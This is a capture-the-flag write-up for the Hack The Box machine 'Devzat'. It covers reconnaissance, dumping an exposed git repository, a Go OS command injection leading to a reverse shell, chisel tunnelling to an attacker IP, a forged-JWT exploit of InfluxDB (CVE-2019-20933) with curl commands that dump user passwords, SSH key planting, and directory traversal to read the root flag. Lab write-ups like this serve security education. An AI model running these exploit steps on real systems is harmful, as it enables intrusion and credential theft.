## Default Information
IP Address: 10.10.11.118\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.118    devzat.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.11.118 --rate=1000 -e tun0
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-28 16:14:27 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.11.118                                    
Discovered open port 8000/tcp on 10.10.11.118                                  
Discovered open port 80/tcp on 10.10.11.118                                                                                 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.4.41 | Open |
| 8000	| SSH | (protocol 2.0) | Open |

```
{Nmap output}
```
### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://devzat.htb. However, we are unable to find any endpoints from http://devzat.htb. Hence, we will start try to use Gobuster to enumerate for virtual hosts that may be present. The virtual host enumeration returned a lot of output but there is only 1 output that returned a status code of 200.

```
pets.devzat.htb
```

We will then add this virtual host to our ```/etc/hosts``` file.

```
10.10.11.118    devzat.htb    pets.devzat.htb
```

Using Gobuster, we will then enumerate the endpoints on http://pets.devzat.htb. From the output, there were a few interesting endpoints (mainly the ```.git``` directory). This meant that the git repositories are publicly accessible and we could possibly dump the git files using [GitTools](https://github.com/internetwache/GitTools)

```
http://pets.devzat.htb/.git/index.html      (Status: 301) [Size: 0] [--> ./]
http://pets.devzat.htb/.git/index           (Status: 200) [Size: 3884]
http://pets.devzat.htb/.git/HEAD            (Status: 200) [Size: 23]
http://pets.devzat.htb/.git/logs/           (Status: 200) [Size: 63]
http://pets.devzat.htb/.git                 (Status: 301) [Size: 41] [--> /.git/]
http://pets.devzat.htb/.git/config          (Status: 200) [Size: 92]
http://pets.devzat.htb/build                (Status: 301) [Size: 42] [--> /build/]
http://pets.devzat.htb/css                  (Status: 301) [Size: 40] [--> /css/]
http://pets.devzat.htb/server-status        (Status: 403) [Size: 280]
```
### Extracting git repository
We will first download the files found on http://pets.devzat.htb/.git to a ```.git``` folder before we extract the source code files.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/GitTools/Dumper]
└─$ ./gitdumper.sh http://pets.devzat.htb/.git/ /home/kali/Desktop/results/git

┌──(kali㉿kali)-[~/Desktop/results/git]
└─$ ls -la
total 12
drwxrwxrwx 3 kali kali 4096 Nov 28 11:27 .
drwxrwxrwx 4 root root 4096 Nov 28 11:27 ..
drwxr-xr-x 6 kali kali 4096 Nov 28 11:28 .git

┌──(HTB)─(kali㉿kali)-[~/Desktop/GitTools/Extractor]
└─$ ./extractor.sh /home/kali/Desktop/results/git /home/kali/Desktop/results/git 
```

### Code Analysis of git repository

Let's first start with main.go to find potential vulnerabilities. From the loadCharacter() function, we can see that the code uses an unsafe exec.Command without proper sanitization of inputs. This means that we can potentially use this to cause a OS command injection. 

In the code, ```cat characteristics/<species>``` is executed but there is no proper sanitization of the input string. This means that we can supply a ```;ls``` to actually cause the code to execute a ```ls``` command on backend server.

```
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```

Tracing this function, we can see that this is called in the addPet() function, specifically in the species field of the JSON body in the request. This is then called again when a POST request is being sent, in the petHandler() function.

```
func addPet(w http.ResponseWriter, r *http.Request) {
    ...
	addPet.Characteristics = loadCharacter(addPet.Species)
	Pets = append(Pets, addPet)
    ...
}

func petHandler(w http.ResponseWriter, r *http.Request) {
	...
	if r.Method == http.MethodPost {
		addPet(w, r)
	}
    ...
}
```

Tracing the petHandler() function, we realize that this is actually an api handler for the ```/api/pet``` route in the handleRequest() function.

```
func handleRequest() {
    ...
	apiHandler := http.HandlerFunc(petHandler)
	http.Handle("/api/pet", headerMiddleware(apiHandler))
	log.Fatal(http.ListenAndServe(":5000", nil))
    ...
}
```

## Exploit
### OS Command Injection
To exploit this OS command injection, we need to first intercept the request sent when adding a pet and modify the species field in the JSON request body.

![OS Command Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Devzat/command_injection.png)

![Ping command](https://github.com/joelczk/writeups/blob/main/HTB/Images/Devzat/ping_command.png)

Now, we will modify the species field in the JSON request body to obtain a reverse shell.

![Reverse shell command](https://github.com/joelczk/writeups/blob/main/HTB/Images/Devzat/reverse_shell.png)

Afterwards, we will have to stabilize the reverse shell

```
patrick@devzat:~/pets$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
patrick@devzat:~/pets$ export TERM=xterm
export TERM=xterm
patrick@devzat:~/pets$ stty cols 132 rows 34
stty cols 132 rows 34
patrick@devzat:~/pets$ 
```

However, we realize that we are still unable to obtain the user flag as we do not have sufficient privileges to do so. We would need to escalate our privileges to catherine to be able to view the user flag.

```
patrick@devzat:/home$ cat patrick/user.txt
cat patrick/user.txt
cat: patrick/user.txt: No such file or directory
patrick@devzat:/home$ cat catherine/user.txt
cat catherine/user.txt
cat: catherine/user.txt: Permission denied
patrick@devzat:/home$ 
```

### Port-forwarding

Using LinEnum script, we realized that there is an open port 8086 on the localhost.

```
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      835/./petshop       
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      838/./devchat
```

Checking the processes for port 8086, we realize that there is a running docker container on this port.

```
patrick@devzat:~$ ps -aux | grep "8086"
ps -aux | grep "8086"                                                                                                                                                                                               
root        1256  0.0  0.1 549056  3808 ?        Sl   Nov28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086
patrick   314167  0.0  0.0   6432   740 pts/0    S+   05:12   0:00 grep --color=auto 8086
```

Now, we will transfer the chisel executable to the server and forward port 8086 to our local machine so that we can examine the open port on the local host. After this is done, we will now be able to examine port 8086 of the localhost on port 8000 of our local machine.

```
## On patrick's SSH session
patrick@devzat:~$ ./chisel_amd64 client 10.10.16.4:8000 R:8086:127.0.0.1:8086
./chisel_amd64 client 10.10.16.4:8000 R:8086:127.0.0.1:8086
2021/11/29 05:32:49 client: Connecting to ws://10.10.16.4:8000
2021/11/29 05:32:53 client: Connected (Latency 269.22667ms)
## On our local machine
┌──(kali㉿kali)-[~/Desktop/chisel]
└─$ ./chisel_amd64 server -p 8000 --reverse
2021/11/29 00:21:45 server: Reverse tunnelling enabled
2021/11/29 00:21:45 server: Fingerprint ZXkTogOkPkBm/OTkaKwdKIB3Nlzrfcb8nKJUpYq3VVU=
2021/11/29 00:21:45 server: Listening on http://0.0.0.0:8000
2021/11/29 00:26:30 server: session#1: tun: proxy#R:8086=>8086: Listening
```

### Exploiting Influx-db (CVE-2019-20933)

Now, we will do a nmap scan on port 8086 on our localhost to identify service on the port.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sC -sV -A -p8086 -T4 localhost -vv
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-29 00:31 EST
PORT     STATE SERVICE REASON         VERSION
8086/tcp open  http    syn-ack ttl 64 InfluxDB http admin 1.7.5
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
```

Looking up InfluxDB http admin 1.7.5, we can find out that InfluxDB 1.7.5 is vulnerable to CVE-2019-20933 which allows authentication by JWT token with an empty shared secret. For this machine, we will use the following token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A", which uses HS256 as the algo and admin as the username 

![JWT Token](https://github.com/joelczk/writeups/blob/main/HTB/Images/Devzat/jwt_token.png)

Next, we will use this JWT token to exeute a query to find out the databases on this InfluxDB instance. From the output, we are able to know that there are 2 databases on this instance, namely devzat and __internal

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A" "http://localhost:8086/query?q=SHOW+DATABASES"
{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["devzat"],["_internal"]]}]}]}
```

Using the devzat database, we will then use the ```Show Measurements``` query to find out the tables on this database, and from the output we know that there is only a ```user``` table in the database.

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A" "http://localhost:8086/query?db=devzat&q=show+measurements"
{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["user"]]}]}]}
```

Last but not least, we will query the user table with ```SELECT * from user;``` and we are able to obtain a password string for the user catherine.

```
──(kali㉿kali)-[~]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A" 'http://localhost:8086/query?db=devzat&q=SELECT+*+FROM+"user";'
{"results":[{"statement_id":0,"series":[{"name":"user","columns":["time","enabled","password","username"],"values":[["2021-06-22T20:04:16.313965493Z",false,"WillyWonka2021","wilhelm"],["2021-06-22T20:04:16.320782034Z",true,"woBeeYareedahc7Oogeephies7Aiseci","catherine"],["2021-06-22T20:04:16.996682002Z",true,"RoyalQueenBee$","charles"]]}]}]}
```

### Privilege Escalation to catherine
Using the credentials, we will escalate our privilege to catherine

```
patrick@devzat:~/pets$ su catherine
su catherine
Password: woBeeYareedahc7Oogeephies7Aiseci
```
### Obtaining user flag

```
catherine@devzat:/home/patrick/pets$ cat /home/catherine/user.txt
cat /home/catherine/user.txt
<Redacted user.txt>
```
### Finding backup file

Navigating to /var/backups, we are able to find a devzat-dev.zip, which we will extract to our local machine.

```
catherine@devzat:/var/backups$ ls
ls
apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  devzat-dev.zip  devzat-main.zip
```

### Code analysis of devzat-dev.zip

Extracting the devzat-dev.zip file on our local machine, we are able to obtain the developer codes. In devchat.go, we can see that in the main function, the code checks for the host key file from /.ssh/id_rsa file and it is connecting to a localhost, and the port is set to 8443 in the variables.

```
var (
	port = 8443
	...
)

func main() {
	... 
	fmt.Printf("Starting chat server on port %d\n", port)
	err = ssh.ListenAndServe(
		fmt.Sprintf("127.0.0.1:%d", port),
		nil,
		ssh.HostKeyFile(os.Getenv("HOME")+"/.ssh/id_rsa"))
	...
}
```

From commands.go, we are able to find the password to the SSH server from the fileCommand() function, and also the github repository that is hosting the code from the helpCommand() function.


```
func fileCommand(u *user, args []string) {
	...
	pass := args[1]

	// Check my secure password
	if pass != "CeilingCatStillAThingIn2021?" {
		u.system("You did provide the wrong password")
		return
	}
	...
}
func helpCommand(u *user, _ []string) {
	u.system("Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat")
	...
}
```

Navigating to the [github repo](https://github.com/quackduck/devzat), we also see that we are required to self-generate an id_rsa file to upload onto our SSH server.

![github repo](https://github.com/joelczk/writeups/blob/main/HTB/Images/Devzat/github_repo.png)

### Adding SSH private key

First let us generate the id_rsa file on our local machine

```
┌──(kali㉿kali)-[~/Desktop/ssh]
└─$ ssh-keygen                                                                           1 ⚙
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Desktop/ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/Desktop/ssh/id_rsa
Your public key has been saved in /home/kali/Desktop/ssh/id_rsa.pub
The key fingerprint is:
SHA256:y5dm5kOjpl/dc3g782uc+UdE5sGmPf2C3gI7/93xjjk kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|              .  |
|               +o|
|              ++o|
|             . o+|
|        S    . .o|
|       . .+o....o|
|        ooB=..=+=|
|        oB+ o E#*|
|      .+. .+.o==#|
+----[SHA256]-----+
```

Checking the environment variables, we realize that the "home" environment variable is set to /home/catherine so we will have to add the id_rsa file to /home/catherine/.ssh/id_rsa

```
catherine@devzat:~$ printenv
printenv
SHELL=/bin/bash
PWD=/home/catherine
LOGNAME=catherine
XDG_SESSION_TYPE=tty
HOME=/home/catherine
```

### Obtaining a SSH shell

However, our shell is not a complete SSH shell yet, so it might not be able to work later on when we SSH again. Hence, we will rename the id_rsa file to authorized_keys file.

```
catherine@devzat:/home/catherine/.ssh$mv id_rsa authorized_keys
```

With this we can now ssh into the SSH server and from there ssh again to gain access to the SSH server on port 8443 on localhost

```
┌──(kali㉿kali)-[~/Desktop/ssh]
└─$ ssh -i id_rsa catherine@10.10.118
catherine@devzat:~$ ssh test3@localhost -p 844
```

Afterwards, we will try to get the file using /file command, but we are unable to obtain the file as we do not have the correct password. So, we will supply the password string to the command, but it seems that /root/devzat/root.txt does not exist

```
test3: /file root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root.txt does not exist!
```
### Obtaining root flag

With that we will use directory traversal to obtain the root flag instead.

```
test3: /file ../../../../root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] <Redacted root flag>
```
